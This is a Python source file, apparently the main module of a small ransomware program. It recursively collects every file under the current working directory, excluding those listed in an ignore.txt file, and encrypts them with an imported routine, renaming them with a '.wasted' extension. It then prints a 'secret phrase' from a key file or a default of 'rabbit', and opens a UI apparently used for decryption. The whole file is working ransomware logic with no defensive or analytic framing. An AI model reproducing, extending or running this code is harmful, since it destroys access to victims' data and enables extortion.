import os
from encrypt import encryption
from ui import run_ui
KEY_FILE = os.path.join(os.path.dirname(__file__), "thekey.key")


EXTENSION = ".wasted"

def discover(directory, files, ignore_files):
    for root, _, file in os.walk(directory):
        for file_name in file:
            file_path = os.path.join(root, file_name)     
            if file_path in ignore_files :
                continue
            elif os.path.isdir(file_path):
                if file_path in ignore_files:
                    continue
                discover(file_path, files, ignore_files)
            else:
                files.append(file_path)

def read_ignore_list(ignore_file):
    ignore_files_list = set()

    if os.path.exists(ignore_file):
        with open(ignore_file, "r") as file:
            for line in file:
                entry = line.strip()
                full_path = os.path.abspath(entry)
                if os.path.exists(full_path):
                    if os.path.isdir(full_path):
                        # If it's a directory, add all files within it to ignore list
                        for root, _, files in os.walk(full_path):
                            for file in files:
                                ignore_files_list.add(os.path.abspath(os.path.join(root, file)))
                    else:
                        ignore_files_list.add(os.path.abspath(full_path))
    return ignore_files_list

def main():
    script_dir = os.path.dirname(__file__)

    ignore_file_path = os.path.join(script_dir, "ignore.txt")
    ignore_files = read_ignore_list(ignore_file_path)
    
    files = []

    discover(os.getcwd(), files, ignore_files)

    encryption(files, KEY_FILE, EXTENSION)
    
    files.clear()
    discover(os.getcwd(), files, ignore_files)

    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as keyfile:
            secret_phrase = keyfile.read()
        print("secret_phrase: " + secret_phrase + "\n")
    else:
        secret_phrase = "rabbit"
        print("secret_phrase: " + secret_phrase + "\n")

    run_ui(files, KEY_FILE, secret_phrase, EXTENSION)
    

    print("\n\n")
    print("finished")

if __name__ == "__main__":
    main()